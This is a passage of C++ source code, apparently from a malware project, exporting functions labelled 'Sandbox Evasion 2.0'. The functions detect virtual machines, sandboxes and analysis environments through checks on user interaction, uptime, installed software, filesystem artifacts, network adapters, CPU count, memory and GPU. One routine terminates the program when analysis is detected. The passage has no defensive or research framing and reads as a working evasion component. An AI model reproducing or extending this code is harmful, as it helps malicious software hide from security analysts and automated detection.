    int GetConfidenceLevel() const { return confidence_level; }
};

// Global instance
static AdvancedSandboxEvasion g_sandboxEvasion;

// Define LogWarning as LogError if not available
#ifndef LogWarning
#define LogWarning LogError
#endif

// Helper functions for string logging
extern "C" {
    void LogInfo(const char* message);
    void LogError(const char* message);
    void LogDebug(const char* message);
}

// Wrapper functions to handle std::string
void LogInfoStr(const std::string& msg) { LogInfo(msg.c_str()); }
void LogErrorStr(const std::string& msg) { LogError(msg.c_str()); }
void LogDebugStr(const std::string& msg) { LogDebug(msg.c_str()); }
void LogWarningStr(const std::string& msg) { LogWarning(msg.c_str()); }

// Macros for easy string logging
#define LOG_INFO_STR(msg) LogInfo((msg).c_str())
#define LOG_ERROR_STR(msg) LogError((msg).c_str())
#define LOG_DEBUG_STR(msg) LogDebug((msg).c_str())
#define LOG_WARNING_STR(msg) LogWarning((msg).c_str())

extern "C" {
    bool CheckEnvironment() {
        AntiVMDetector detector;
        bool isClean = detector.CheckEnvironment();
        
        if (!isClean) {
            std::string warning = "Virtual machine detected: " + detector.GetDetectedVM();
            LogWarning(warning.c_str());
        } else {
            LogInfo("Environment check passed - no VM detected");
        }
        
        return isClean;
    }
    
    bool CheckVMEnvironment() {
        AntiVMDetector detector;
        bool isClean = detector.CheckEnvironment();
        
        if (!isClean) {
            std::string warning = "Virtual machine detected: " + detector.GetDetectedVM();
            LogWarning(warning.c_str());
        }
        
        return isClean;
    }
    
    bool CheckSandboxEnvironment() {
        AntiVMDetector detector;
        bool isClean = detector.CheckCompleteEnvironment();
        
        if (!isClean) {
            std::string warning = "Sandbox/VM detected: " + detector.GetDetectedVM();
            LogWarning(warning.c_str());
        } else {
            LogInfo("Complete environment check passed - no sandbox/VM detected");
        }
        
        return isClean;
    }
    
    bool PerformCompleteAnalysisCheck() {
        AntiVMDetector detector;
        
        // Comprehensive check including all detection methods
        bool isClean = detector.CheckCompleteEnvironment();
        
        if (!isClean) {
            std::string warning = "Analysis environment detected: " + detector.GetDetectedVM();
            LogError(warning.c_str());
            
            // Additional actions when analysis environment is detected
            LogError("Terminating due to analysis environment detection");
            return false;
        } else {
            LogInfo("All environment checks passed - system appears clean");
        }
        
        return isClean;
    }
    
    // Новые функции Sandbox Evasion 2.0
    bool PerformAdvancedSandboxCheck() {
        bool isClean = g_sandboxEvasion.PerformComprehensiveCheck();
        
        if (!isClean) {
            std::string warning = "Advanced Sandbox detected: " + g_sandboxEvasion.GetDetectionReason() + 
                                " (confidence: " + std::to_string(g_sandboxEvasion.GetConfidenceLevel()) + "/10)";
            LogError(warning.c_str());
        } else {
            LogInfo("Advanced sandbox check passed - environment appears legitimate");
        }
        
        return isClean;
    }
    
    bool CheckAdvancedUserInteraction() {
        return g_sandboxEvasion.CheckUserInteraction();
    }
    
    bool CheckAdvancedSystemUptime() {
        return g_sandboxEvasion.CheckSystemUptime();
    }
    
    bool CheckAdvancedInstalledSoftware() {
        return g_sandboxEvasion.CheckInstalledSoftware();
    }
    
    bool CheckAdvancedFileSystemArtifacts() {
        return g_sandboxEvasion.CheckFileSystemArtifacts();
    }
    
    bool CheckAdvancedNetworkAdapters() {
        return g_sandboxEvasion.CheckNetworkAdapters();
    }
    
    bool CheckAdvancedCPUCount() {
        return g_sandboxEvasion.CheckCPUCount();
    }
    
    bool CheckAdvancedMemoryPatterns() {
        return g_sandboxEvasion.CheckMemoryPatterns();
    }
    
    bool CheckAdvancedGPUPresence() {
        return g_sandboxEvasion.CheckGPUPresence();
    }
    
    int GetSandboxConfidenceLevel() {
        return g_sandboxEvasion.GetConfidenceLevel();
    }
}